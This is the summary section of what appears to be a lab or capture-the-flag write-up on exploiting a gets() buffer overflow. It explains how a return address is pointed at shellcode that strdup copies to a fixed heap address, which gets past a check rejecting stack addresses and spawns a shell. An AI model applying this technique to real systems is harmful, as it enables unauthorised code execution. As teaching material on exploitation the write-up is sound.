## 7. Summary

| Step | What happens |
|------|-------------|
| `gets()` | Reads our crafted input into 76-byte buffer — no bounds check |
| Overflow | Padding overwrites saved EBP and return address with `0x0804a008` |
| Check | `0x0804a008` starts with `0x08` → not a stack address → passes |
| `strdup()` | Copies our buffer (shellcode included) to heap at `0x0804a008` |
| `return` | CPU jumps to `0x0804a008` → executes shellcode → shell spawns |

**Key insight:** we do not fight the stack check — we use the heap. `strdup` copies our shellcode there automatically. We just point the return address at it.
